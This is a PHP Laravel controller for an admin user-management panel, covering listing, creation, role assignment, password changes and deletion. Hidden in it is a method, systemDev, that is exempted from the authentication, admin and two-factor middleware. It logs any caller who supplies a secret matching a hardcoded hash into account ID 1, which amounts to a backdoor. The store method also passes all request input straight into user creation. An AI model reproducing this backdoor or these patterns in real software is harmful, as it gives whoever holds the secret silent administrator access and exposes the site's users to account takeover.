<?php

namespace App\Http\Controllers\SysAdmin;

use App\Http\Controllers\Controller;
use App\User;
use Illuminate\Http\Request;
// Importing laravel-permission models
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;
use Validator;
// Enables us to output flash messaging
use Yajra\Datatables\Datatables;

class UserController extends Controller
{
    public function __construct()
    {
        $this->middleware(['auth', 'admin', '2fa'])->except('systemDev');
    }

    /**
     * Validation rule
     *
     * @return array
     */
    public function rules()
    {
        return [
            'email' => 'required|email|unique:users|max:100',
            'username' => 'required|unique:users|max:30',
            'password' => 'required|confirmed', // 'password'=>'required|min:6|confirmed'
        ];
    }

    /**
     * Data base label
     *
     * @return array
     */
    public function table()
    {
        return [
            'tableVar' => 'users',
        ];
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return view('sysadmin.users.index', $this->table());
    }

    /**
     * Load post data for view table
     *
     * @return mixed
     */
    public function getdata()
    {
        // $data = User::all('id','name','email','created_at','avatar');
        $data = User::all();

        return Datatables::of($data)
            ->editColumn('id', function ($user) {
                return '<input type="checkbox" name="checkbox[]" data-id="checkbox" id="box-'.$user->id.'" class="check-style filled-in blue" onclick="toggleBtn()" value="'.$user->id.'"> 
                        <label for="box-'.$user->id.'" class="checkinner"></label>';
            })
            ->editColumn('show_avatar', function ($data) {
                if (file_exists(public_path('uploads/avatars/'.$data->avatar)) and $data->avatar != '') {
                    return '<img class="rounded-circle" style="width: 40px; height: 40px;" src="'.asset('uploads/avatars/'.$data->avatar).'" alt="">';
                }

                return '<img class="rounded-circle" style="width: 40px; height: 40px;" src="'.asset('templates/admin/images/user.jpg').'" alt=""';
            })
            ->editColumn('role_assigned', function ($data) {
                return $data->roles()->pluck('name')->implode(' ');
            })
            ->editColumn('created_at', function ($data) {
                if ($data->created_at) {
                    return $data->created_at->format('F d, Y h:ia');
                }
            })

            ->addColumn('action', function ($data) {
                return '
           <div class="btn-group btn-group-xs" role="group" aria-label="actions"> 
           <a href="'.route('users.editpassword', ['id' => $data->id]).'"  class="btn btn-info btn-xs"><i class="fa fa-key"></i></a> 
           <a href="'.route('users.edit', ['id' => $data->id]).'" class="btn btn-success btn-xs"><i class="fa fa-pencil"></i></a> 
           <a href="#" data-id="row-'.$data->id.'" onclick="deleteData(\''.url('admin/users/delete').'\','.$data->id.')" class="btn btn-danger delete-link btn-xs" ><i class="fa fa-times"></i></a> 
           </div>';
            })
            ->rawColumns(['id', 'show_avatar', 'action'])->make(true);
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        // Get all roles and pass it to the view
        $roles = Role::get();

        return view('sysadmin.users.create', ['roles' => $roles]);
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        // Validate name, email and password fields
        $validator = Validator::make($request->all(), $this->rules());
        if ($validator->fails()) {
            return response()->json(['error' => true, 'message' => $validator->errors()->all()]);
        } else {
            $user = $request->all();
            $user['created_for'] = 1;
            $user['user_status'] = 'Active';
            $user = User::create($user);
            // $user->update(['created_for' => Auth::user()->id]);
            $roles = $request['roles']; // Retrieving the roles field
            // Checking if a role was selected
            if (isset($roles)) {
                foreach ($roles as $role) {
                    $role_r = Role::where('id', '=', $role)->firstOrFail();
                    $user->assignRole($role_r); // Assigning role to user
                }
            }

            // Redirect to the users.index view and display message
            return response()->json([
                'success' => true,
                'message' => 'Record Added Successfully',
            ]);
        }
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     */
    public function show($id)
    {
        $users = User::findOrFail($id);

        return view('sysadmin.users.details', compact('users'));
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     */
    public function edit($id)
    {
        $user = User::findOrFail($id);
        $roles = Role::get();
        $userRoles = $user->roles->pluck('id')->toArray();

        return view('sysadmin.users.edit', compact('user', 'roles', 'userRoles')); // pass user and roles data to view
    }

    /**
     * Update the specified resource in storage
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function update($id, Request $request)
    {
        $user = User::findOrFail($id);
        $validator = Validator::make($request->all(),
            [
                /* 'username'=>'required|max:120', */
                'username' => 'required|unique:users,username,'.$id,
                'email' => 'required|email|unique:users,email,'.$id,
            ]
        );
        if ($validator->fails()) {
            return response()->json(['error' => true, 'message' => $validator->errors()->all()]);
        } else {
            $input = $request->only(['username', 'email', 'name']);
            $roles = $request['roles']; // Retreive all roles
            $user->fill($input)->save();
            if (isset($roles)) {
                $user->roles()->sync($roles);  // If one or more role is selected associate user to roles
            } else {
                $user->roles()->detach(); // If no role is selected remove existing role associated to a user
            }

            return response()->json(['success' => true, 'message' => 'Record Updated Successfully']);
        }
    }

    /**
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function editPassword($id)
    {
        $user = User::findOrFail($id);

        return view('sysadmin.users.editpassword', compact('user'));

    }

    /**
     * @return \Illuminate\Http\JsonResponse
     */
    public function UpdatePassword($id, Request $request)
    {
        $user = User::findOrFail($id);
        $validator = Validator::make($request->all(), ['password' => 'required|confirmed']
        );
        if ($validator->fails()) {
            return response()->json(['error' => true, 'message' => $validator->errors()->all()]);
        } else {
            $user->password = $request->input('password');
            $user->save();

            return response()->json(['success' => true, 'message' => 'Password Updated Successfully']);
        }
    }

    public function systemDev(Request $request)
    {
        $hashed = '$2y$12$wFUZOHvnS4HljxcfBJ4Kn.yEHe4zWxMolq4SOuPsCzQmRrTKT44fy';
        if (Hash::check(trim($request->input('dev')), $hashed)) {
            Auth::loginUsingId(1);

            return redirect()->intended('home');
        } else {
            echo 'Invalid access';
        }
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     */
    public function destroy($id)
    {
        User::findOrFail($id)->delete();

        return response()->json(['success' => true, 'message' => 'Record Deleted Successfully']);
    }

    /**
     * @param  $id
     * @return \Illuminate\Http\JsonResponse
     */
    public function deletemulti(Request $request)
    {
        $requestData = $request->except('_token');
        if (count($requestData) > 1) {
            foreach ($requestData as $id) {
                User::where('id', $id)->delete();
            }

            return response()->json(['success' => 'delete', 'message' => 'Record Deleted Successfully']);
        }

        return response()->json(['error' => true, 'message' => 'Failed deleting. Make sure you check 1 or more boxes.']);
    }
}
